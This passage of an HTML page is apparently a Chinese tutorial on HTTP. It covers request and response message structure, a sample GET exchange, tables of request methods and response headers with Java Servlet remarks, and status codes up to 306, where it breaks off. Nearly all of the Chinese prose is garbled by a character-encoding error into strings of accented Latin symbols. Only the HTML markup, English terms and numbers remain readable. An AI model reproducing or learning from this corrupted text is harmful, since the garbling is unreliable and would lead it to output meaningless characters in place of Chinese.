lineï¼‰ã€è¯·æ±‚å¤´éƒ¨ï¼ˆheaderï¼‰ã€ç©ºè¡Œå’Œè¯·æ±‚æ•°æ®å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œä¸‹å›¾ç»™å‡ºäº†è¯·æ±‚æŠ¥æ–‡çš„ä¸€èˆ¬æ ¼å¼ã€‚<img src="https://www.runoob.com/wp-content/uploads/2013/11/2012072810301161.png" alt="img"></p><p>è¯·æ±‚è¡Œä»¥ä¸€ä¸ªæ–¹æ³•ç¬¦å·å¼€å¤´ï¼Œä»¥ç©ºæ ¼åˆ†å¼€ï¼Œåé¢è·Ÿç€è¯·æ±‚çš„ URI å’Œåè®®çš„ç‰ˆæœ¬ã€‚<br>ã€Methodã€‘ ã€Request-URIã€‘ ã€HTTP-Versionã€‘ ã€CRLFã€‘</p><h3 id="2ï¼‰æœåŠ¡å™¨å“åº”æ¶ˆæ¯"><a href="#2ï¼‰æœåŠ¡å™¨å“åº”æ¶ˆæ¯" class="headerlink" title="2ï¼‰æœåŠ¡å™¨å“åº”æ¶ˆæ¯"></a>2ï¼‰æœåŠ¡å™¨å“åº”æ¶ˆæ¯</h3><p>HTTPå“åº”ä¹Ÿç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼šçŠ¶æ€è¡Œã€æ¶ˆæ¯æŠ¥å¤´ã€ç©ºè¡Œå’Œå“åº”æ­£æ–‡ã€‚</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/11/httpmessage.jpg" alt="img"></p><h3 id="3ï¼‰å®ä¾‹"><a href="#3ï¼‰å®ä¾‹" class="headerlink" title="3ï¼‰å®ä¾‹"></a>3ï¼‰å®ä¾‹</h3><p>ä¸‹é¢å®ä¾‹æ˜¯ä¸€ç‚¹å…¸å‹çš„ä½¿ç”¨GETæ¥ä¼ é€’æ•°æ®çš„å®ä¾‹ï¼š</p><p>å®¢æˆ·ç«¯è¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hello.txt</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.16.3 libcurl/7.16.3 OpenSSL/0.9.7l zlib/1.2.3<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.example.com<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en, mi<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å“åº”:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 27 Jul 2009 12:28:53 GMT<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Wed, 22 Jul 2009 19:15:56 GMT<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;34aa387-d-1568eb00&quot;<br><span class="hljs-attribute">Accept-Ranges</span><span class="hljs-punctuation">: </span>bytes<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>51<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Hello World! My payload includes a trailing CRLF.<br></code></pre></td></tr></table></figure><h2 id="3ã€HTTP-è¯·æ±‚æ–¹æ³•"><a href="#3ã€HTTP-è¯·æ±‚æ–¹æ³•" class="headerlink" title="3ã€HTTP è¯·æ±‚æ–¹æ³•"></a>3ã€HTTP è¯·æ±‚æ–¹æ³•</h2><p>æ ¹æ® HTTP æ ‡å‡†ï¼ŒHTTP è¯·æ±‚å¯ä»¥ä½¿ç”¨å¤šç§è¯·æ±‚æ–¹æ³•ã€‚</p><p>HTTP 1.0 å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š GET, POST å’Œ HEAD æ–¹æ³•ã€‚</p><p>HTTP 1.1 æ–°å¢äº†å…­ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONSã€PUTã€PATCHã€DELETEã€TRACE å’Œ CONNECT æ–¹æ³•ã€‚</p><div class="table-container"><table><thead><tr><th>åºå·</th><th>æ–¹æ³•</th><th>æè¿°</th></tr></thead><tbody><tr><td>1</td><td>GET</td><td>è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›å®ä½“ä¸»ä½“ã€‚</td></tr><tr><td>2</td><td>HEAD</td><td>ç±»ä¼¼äºGETè¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›çš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºè·å–æŠ¥å¤´ã€‚</td></tr><tr><td>3</td><td>POST</td><td>å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚</td></tr><tr><td>4</td><td>PUT</td><td>ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚</td></tr><tr><td>5</td><td>DELETE</td><td>è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚</td></tr><tr><td>7</td><td>OPTIONS</td><td>å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½</td></tr><tr><td>8</td><td>TRACE</td><td>å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­</td></tr><tr><td>9</td><td>PATCH</td><td>æ˜¯å¯¹ PUT æ–¹æ³•çš„è¡¥å……ï¼Œç”¨æ¥å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–° ã€‚</td></tr></tbody></table></div><p>æ³¨æ„ï¼š<br>1ï¼‰æ–¹æ³•åç§°æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚<br>2ï¼‰HTTP æœåŠ¡å™¨è‡³å°‘åº”è¯¥å®ç° GET å’Œ POST æ–¹æ³•ï¼Œæ­¤å¤–é™¤ä¸Šè¿°æ–¹æ³•ï¼Œç‰¹å®šçš„ HTTP æœåŠ¡å™¨æ”¯æŒæ‰©å±•è‡ªå®šä¹‰çš„æ–¹æ³•ã€‚</p><h2 id="4ã€HTTP-å“åº”å¤´ä¿¡æ¯"><a href="#4ã€HTTP-å“åº”å¤´ä¿¡æ¯" class="headerlink" title="4ã€HTTP å“åº”å¤´ä¿¡æ¯"></a>4ã€HTTP å“åº”å¤´ä¿¡æ¯</h2><p>HTTPè¯·æ±‚å¤´æä¾›äº†å…³äºè¯·æ±‚ï¼Œå“åº”æˆ–è€…å…¶ä»–çš„å‘é€å®ä½“çš„ä¿¡æ¯ã€‚</p><p>æ¥ä¸‹æ¥å…·ä½“ä»‹ç»HTTPå“åº”å¤´ä¿¡æ¯ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:left">åº”ç­”å¤´</th><th style="text-align:left">è¯´æ˜</th></tr></thead><tbody><tr><td style="text-align:left">Allow</td><td style="text-align:left">æœåŠ¡å™¨æ”¯æŒå“ªäº›è¯·æ±‚æ–¹æ³•ï¼ˆå¦‚GETã€POSTç­‰ï¼‰ã€‚</td></tr><tr><td style="text-align:left">Content-Encoding</td><td style="text-align:left">æ–‡æ¡£çš„ç¼–ç ï¼ˆEncodeï¼‰æ–¹æ³•ã€‚åªæœ‰åœ¨è§£ç ä¹‹åæ‰å¯ä»¥å¾—åˆ°Content-Typeå¤´æŒ‡å®šçš„å†…å®¹ç±»å‹ã€‚åˆ©ç”¨gzipå‹ç¼©æ–‡æ¡£èƒ½å¤Ÿæ˜¾è‘—åœ°å‡å°‘HTMLæ–‡æ¡£çš„ä¸‹è½½æ—¶é—´ã€‚Javaçš„GZIPOutputStreamå¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œgzipå‹ç¼©ï¼Œä½†åªæœ‰Unixä¸Šçš„Netscapeå’ŒWindowsä¸Šçš„IE 4ã€IE 5æ‰æ”¯æŒå®ƒã€‚å› æ­¤ï¼ŒServletåº”è¯¥é€šè¿‡æŸ¥çœ‹Accept-Encodingå¤´ï¼ˆå³request.getHeader(â€œAccept-Encodingâ€)ï¼‰æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦æ”¯æŒgzipï¼Œä¸ºæ”¯æŒgzipçš„æµè§ˆå™¨è¿”å›ç»gzipå‹ç¼©çš„HTMLé¡µé¢ï¼Œä¸ºå…¶ä»–æµè§ˆå™¨è¿”å›æ™®é€šé¡µé¢ã€‚</td></tr><tr><td style="text-align:left">Content-Length</td><td style="text-align:left">è¡¨ç¤ºå†…å®¹é•¿åº¦ã€‚åªæœ‰å½“æµè§ˆå™¨ä½¿ç”¨æŒä¹…HTTPè¿æ¥æ—¶æ‰éœ€è¦è¿™ä¸ªæ•°æ®ã€‚å¦‚æœä½ æƒ³è¦åˆ©ç”¨æŒä¹…è¿æ¥çš„ä¼˜åŠ¿ï¼Œå¯ä»¥æŠŠè¾“å‡ºæ–‡æ¡£å†™å…¥ ByteArrayOutputStreamï¼Œå®ŒæˆåæŸ¥çœ‹å…¶å¤§å°ï¼Œç„¶åæŠŠè¯¥å€¼æ”¾å…¥Content-Lengthå¤´ï¼Œæœ€åé€šè¿‡byteArrayStream.writeTo(response.getOutputStream()å‘é€å†…å®¹ã€‚</td></tr><tr><td style="text-align:left">Content-Type</td><td style="text-align:left">è¡¨ç¤ºåé¢çš„æ–‡æ¡£å±äºä»€ä¹ˆMIMEç±»å‹ã€‚Servleté»˜è®¤ä¸ºtext/plainï¼Œä½†é€šå¸¸éœ€è¦æ˜¾å¼åœ°æŒ‡å®šä¸ºtext/htmlã€‚ç”±äºç»å¸¸è¦è®¾ç½®Content-Typeï¼Œå› æ­¤HttpServletResponseæä¾›äº†ä¸€ä¸ªä¸“ç”¨çš„æ–¹æ³•setContentTypeã€‚</td></tr><tr><td style="text-align:left">Date</td><td style="text-align:left">å½“å‰çš„GMTæ—¶é—´ã€‚ä½ å¯ä»¥ç”¨setDateHeaderæ¥è®¾ç½®è¿™ä¸ªå¤´ä»¥é¿å…è½¬æ¢æ—¶é—´æ ¼å¼çš„éº»çƒ¦ã€‚</td></tr><tr><td style="text-align:left">Expires</td><td style="text-align:left">åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™è®¤ä¸ºæ–‡æ¡£å·²ç»è¿‡æœŸï¼Œä»è€Œä¸å†ç¼“å­˜å®ƒï¼Ÿ</td></tr><tr><td style="text-align:left">Last-Modified</td><td style="text-align:left">æ–‡æ¡£çš„æœ€åæ”¹åŠ¨æ—¶é—´ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡If-Modified-Sinceè¯·æ±‚å¤´æä¾›ä¸€ä¸ªæ—¥æœŸï¼Œè¯¥è¯·æ±‚å°†è¢«è§†ä¸ºä¸€ä¸ªæ¡ä»¶GETï¼Œåªæœ‰æ”¹åŠ¨æ—¶é—´è¿ŸäºæŒ‡å®šæ—¶é—´çš„æ–‡æ¡£æ‰ä¼šè¿”å›ï¼Œå¦åˆ™è¿”å›ä¸€ä¸ª304ï¼ˆNot Modifiedï¼‰çŠ¶æ€ã€‚Last-Modifiedä¹Ÿå¯ç”¨setDateHeaderæ–¹æ³•æ¥è®¾ç½®ã€‚</td></tr><tr><td style="text-align:left">Location</td><td style="text-align:left">è¡¨ç¤ºå®¢æˆ·åº”å½“åˆ°å“ªé‡Œå»æå–æ–‡æ¡£ã€‚Locationé€šå¸¸ä¸æ˜¯ç›´æ¥è®¾ç½®çš„ï¼Œè€Œæ˜¯é€šè¿‡HttpServletResponseçš„sendRedirectæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åŒæ—¶è®¾ç½®çŠ¶æ€ä»£ç ä¸º302ã€‚</td></tr><tr><td style="text-align:left">Refresh</td><td style="text-align:left">è¡¨ç¤ºæµè§ˆå™¨åº”è¯¥åœ¨å¤šå°‘æ—¶é—´ä¹‹ååˆ·æ–°æ–‡æ¡£ï¼Œä»¥ç§’è®¡ã€‚é™¤äº†åˆ·æ–°å½“å‰æ–‡æ¡£ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥é€šè¿‡setHeader(â€œRefreshâ€, â€œ5; URL=<a href="http://host/path&quot;)è®©æµè§ˆå™¨è¯»å–æŒ‡å®šçš„é¡µé¢ã€‚">http://host/path&quot;)è®©æµè§ˆå™¨è¯»å–æŒ‡å®šçš„é¡µé¢ã€‚</a> æ³¨æ„è¿™ç§åŠŸèƒ½é€šå¸¸æ˜¯é€šè¿‡è®¾ç½®HTMLé¡µé¢HEADåŒºçš„ï¼œMETA HTTP-EQUIV=â€Refreshâ€ CONTENT=â€5;URL=<a href="http://host/path&quot;ï¼å®ç°ï¼Œè¿™æ˜¯å› ä¸ºï¼Œè‡ªåŠ¨åˆ·æ–°æˆ–é‡å®šå‘å¯¹äºé‚£äº›ä¸èƒ½ä½¿ç”¨CGIæˆ–Servletçš„HTMLç¼–å†™è€…ååˆ†é‡è¦ã€‚ä½†æ˜¯ï¼Œå¯¹äºServletæ¥è¯´ï¼Œç›´æ¥è®¾ç½®Refreshå¤´æ›´åŠ æ–¹ä¾¿ã€‚">http://host/path&quot;ï¼å®ç°ï¼Œè¿™æ˜¯å› ä¸ºï¼Œè‡ªåŠ¨åˆ·æ–°æˆ–é‡å®šå‘å¯¹äºé‚£äº›ä¸èƒ½ä½¿ç”¨CGIæˆ–Servletçš„HTMLç¼–å†™è€…ååˆ†é‡è¦ã€‚ä½†æ˜¯ï¼Œå¯¹äºServletæ¥è¯´ï¼Œç›´æ¥è®¾ç½®Refreshå¤´æ›´åŠ æ–¹ä¾¿ã€‚</a>  æ³¨æ„Refreshçš„æ„ä¹‰æ˜¯â€Nç§’ä¹‹ååˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ï¼Œè€Œä¸æ˜¯â€æ¯éš”Nç§’åˆ·æ–°æœ¬é¡µé¢æˆ–è®¿é—®æŒ‡å®šé¡µé¢â€ã€‚å› æ­¤ï¼Œè¿ç»­åˆ·æ–°è¦æ±‚æ¯æ¬¡éƒ½å‘é€ä¸€ä¸ªRefreshå¤´ï¼Œè€Œå‘é€204çŠ¶æ€ä»£ç åˆ™å¯ä»¥é˜»æ­¢æµè§ˆå™¨ç»§ç»­åˆ·æ–°ï¼Œä¸ç®¡æ˜¯ä½¿ç”¨Refreshå¤´è¿˜æ˜¯ï¼œMETA HTTP-EQUIV=â€Refreshâ€ â€¦ï¼ã€‚  æ³¨æ„Refreshå¤´ä¸å±äºHTTP 1.1æ­£å¼è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‰©å±•ï¼Œä½†Netscapeå’ŒIEéƒ½æ”¯æŒå®ƒã€‚</td></tr><tr><td style="text-align:left">Server</td><td style="text-align:left">æœåŠ¡å™¨åå­—ã€‚Servletä¸€èˆ¬ä¸è®¾ç½®è¿™ä¸ªå€¼ï¼Œè€Œæ˜¯ç”±WebæœåŠ¡å™¨è‡ªå·±è®¾ç½®ã€‚</td></tr><tr><td style="text-align:left">Set-Cookie</td><td style="text-align:left">è®¾ç½®å’Œé¡µé¢å…³è”çš„Cookieã€‚Servletä¸åº”ä½¿ç”¨response.setHeader(â€œSet-Cookieâ€, â€¦)ï¼Œè€Œæ˜¯åº”ä½¿ç”¨HttpServletResponseæä¾›çš„ä¸“ç”¨æ–¹æ³•addCookieã€‚å‚è§ä¸‹æ–‡æœ‰å…³Cookieè®¾ç½®çš„è®¨è®ºã€‚</td></tr><tr><td style="text-align:left">WWW-Authenticate</td><td style="text-align:left">å®¢æˆ·åº”è¯¥åœ¨Authorizationå¤´ä¸­æä¾›ä»€ä¹ˆç±»å‹çš„æˆæƒä¿¡æ¯ï¼Ÿåœ¨åŒ…å«401ï¼ˆUnauthorizedï¼‰çŠ¶æ€è¡Œçš„åº”ç­”ä¸­è¿™ä¸ªå¤´æ˜¯å¿…éœ€çš„ã€‚ä¾‹å¦‚ï¼Œresponse.setHeader(â€œWWW-Authenticateâ€, â€œBASIC realm=ï¼¼â€executivesï¼¼â€â€)ã€‚ æ³¨æ„Servletä¸€èˆ¬ä¸è¿›è¡Œè¿™æ–¹é¢çš„å¤„ç†ï¼Œè€Œæ˜¯è®©WebæœåŠ¡å™¨çš„ä¸“é—¨æœºåˆ¶æ¥æ§åˆ¶å—å¯†ç ä¿æŠ¤é¡µé¢çš„è®¿é—®ï¼ˆä¾‹å¦‚.htaccessï¼‰ã€‚</td></tr></tbody></table></div><h2 id="5ã€HTTP-çŠ¶æ€ç "><a href="#5ã€HTTP-çŠ¶æ€ç " class="headerlink" title="5ã€HTTP çŠ¶æ€ç "></a>5ã€HTTP çŠ¶æ€ç </h2><p>å½“æµè§ˆè€…è®¿é—®ä¸€ä¸ªç½‘é¡µæ—¶ï¼Œæµè§ˆè€…çš„æµè§ˆå™¨ä¼šå‘ç½‘é¡µæ‰€åœ¨æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ã€‚å½“æµè§ˆå™¨æ¥æ”¶å¹¶æ˜¾ç¤ºç½‘é¡µå‰ï¼Œæ­¤ç½‘é¡µæ‰€åœ¨çš„æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªåŒ…å«HTTPçŠ¶æ€ç çš„ä¿¡æ¯å¤´ï¼ˆserver headerï¼‰ç”¨ä»¥å“åº”æµè§ˆå™¨çš„è¯·æ±‚ã€‚</p><p>HTTPçŠ¶æ€ç çš„è‹±æ–‡ä¸º HTTP Status Codeã€‚</p><p>ä¸‹é¢æ˜¯å¸¸è§çš„HTTPçŠ¶æ€ç ï¼š</p><ul><li>200 - è¯·æ±‚æˆåŠŸ</li><li>301 - èµ„æºï¼ˆç½‘é¡µç­‰ï¼‰è¢«æ°¸ä¹…è½¬ç§»åˆ°å…¶å®ƒURL</li><li>404 - è¯·æ±‚çš„èµ„æºï¼ˆç½‘é¡µç­‰ï¼‰ä¸å­˜åœ¨</li><li>500 - å†…éƒ¨æœåŠ¡å™¨é”™è¯¯</li><li>405 - æŸä¸ªè¯·æ±‚æ‰€é’ˆå¯¹çš„èµ„æºä¸æ”¯æŒå¯¹åº”çš„è¯·æ±‚æ–¹æ³•</li><li>501 - æœåŠ¡å™¨ä¸è®¤è¯†æˆ–è€…ä¸æ”¯æŒå¯¹åº”çš„è¯·æ±‚æ–¹æ³•</li></ul><h3 id="1ï¼‰HTTPçŠ¶æ€ç åˆ†ç±»"><a href="#1ï¼‰HTTPçŠ¶æ€ç åˆ†ç±»" class="headerlink" title="1ï¼‰HTTPçŠ¶æ€ç åˆ†ç±»"></a>1ï¼‰HTTPçŠ¶æ€ç åˆ†ç±»</h3><p>HTTPçŠ¶æ€ç ç”±ä¸‰ä¸ªåè¿›åˆ¶æ•°å­—ç»„æˆï¼Œç¬¬ä¸€ä¸ªåè¿›åˆ¶æ•°å­—å®šä¹‰äº†çŠ¶æ€ç çš„ç±»å‹ï¼Œåä¸¤ä¸ªæ•°å­—æ²¡æœ‰åˆ†ç±»çš„ä½œç”¨ã€‚HTTPçŠ¶æ€ç å…±åˆ†ä¸º5ç§ç±»å‹ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:left">åˆ†ç±»</th><th style="text-align:left">åˆ†ç±»æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">1**</td><td style="text-align:left">ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œï¼Œä¸€èˆ¬æ˜¯å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œè¯·æ±‚å·²ç»æ”¶åˆ°äº†ï¼Œæ­£åœ¨å¤„ç†ï¼Œåˆ«æ€¥ã€‚</td></tr><tr><td style="text-align:left">2**</td><td style="text-align:left">æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†ï¼Œä¸€èˆ¬è¡¨ç¤ºï¼šè¯·æ±‚æ”¶æ‚‰ã€æˆ‘æ˜ç™½ä½ è¦çš„ã€è¯·æ±‚å·²å—ç†ã€å·²ç»å¤„ç†å®Œæˆç­‰ä¿¡æ¯ã€‚</td></tr><tr><td style="text-align:left">3**</td><td style="text-align:left">é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚</td></tr><tr><td style="text-align:left">4**</td><td style="text-align:left">å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚ï¼Œè´£ä»»åœ¨å®¢æˆ·ç«¯ï¼Œå¦‚å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºï¼Œå®¢æˆ·ç«¯æœªè¢«æˆæƒï¼Œç¦æ­¢è®¿é—®ç­‰ã€‚</td></tr><tr><td style="text-align:left">5**</td><td style="text-align:left">æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ï¼Œè´£ä»»åœ¨æœåŠ¡ç«¯ï¼Œå¦‚æœåŠ¡ç«¯æŠ›å‡ºå¼‚å¸¸ï¼Œè·¯ç”±å‡ºé”™ï¼ŒHTTP ç‰ˆæœ¬ä¸æ”¯æŒç­‰ã€‚</td></tr></tbody></table></div><h3 id="2ï¼‰HTTPçŠ¶æ€ç åˆ—è¡¨"><a href="#2ï¼‰HTTPçŠ¶æ€ç åˆ—è¡¨" class="headerlink" title="2ï¼‰HTTPçŠ¶æ€ç åˆ—è¡¨:"></a>2ï¼‰HTTPçŠ¶æ€ç åˆ—è¡¨:</h3><div class="table-container"><table><thead><tr><th style="text-align:left">çŠ¶æ€ç </th><th style="text-align:left">çŠ¶æ€ç è‹±æ–‡åç§°</th><th style="text-align:left">ä¸­æ–‡æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">100</td><td style="text-align:left">Continue</td><td style="text-align:left">ç»§ç»­ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­å…¶è¯·æ±‚</td></tr><tr><td style="text-align:left">101</td><td style="text-align:left">Switching Protocols</td><td style="text-align:left">åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®®</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">200</td><td style="text-align:left">OK</td><td style="text-align:left">è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºGETä¸POSTè¯·æ±‚</td></tr><tr><td style="text-align:left">201</td><td style="text-align:left">Created</td><td style="text-align:left">å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº</td></tr><tr><td style="text-align:left">202</td><td style="text-align:left">Accepted</td><td style="text-align:left">å·²æ¥å—ã€‚å·²ç»æ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ</td></tr><tr><td style="text-align:left">203</td><td style="text-align:left">Non-Authoritative Information</td><td style="text-align:left">éæˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›çš„metaä¿¡æ¯ä¸åœ¨åŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬</td></tr><tr><td style="text-align:left">204</td><td style="text-align:left">No Content</td><td style="text-align:left">æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£</td></tr><tr><td style="text-align:left">205</td><td style="text-align:left">Reset Content</td><td style="text-align:left">é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›ç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ</td></tr><tr><td style="text-align:left">206</td><td style="text-align:left">Partial Content</td><td style="text-align:left">éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚</td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">300</td><td style="text-align:left">Multiple Choices</td><td style="text-align:left">å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›ä¸€ä¸ªèµ„æºç‰¹å¾ä¸åœ°å€çš„åˆ—è¡¨ç”¨äºç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹©</td></tr><tr><td style="text-align:left">301</td><td style="text-align:left">Moved Permanently</td><td style="text-align:left">æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿</td></tr><tr><td style="text-align:left">302</td><td style="text-align:left">Found</td><td style="text-align:left">ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI</td></tr><tr><td style="text-align:left">303</td><td style="text-align:left">See Other</td><td style="text-align:left">æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹</td></tr><tr><td style="text-align:left">304</td><td style="text-align:left">Not Modified</td><td style="text-align:left">æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›ä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›åœ¨æŒ‡å®šæ—¥æœŸä¹‹åä¿®æ”¹çš„èµ„æº</td></tr><tr><td style="text-align:left">305</td><td style="text-align:left">Use Proxy</td><td style="text-align:left">ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—®</td></tr><tr><td style="text-align:left">306</td><td style="text-align:left">Unused</td><td style="text-align:left">å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç 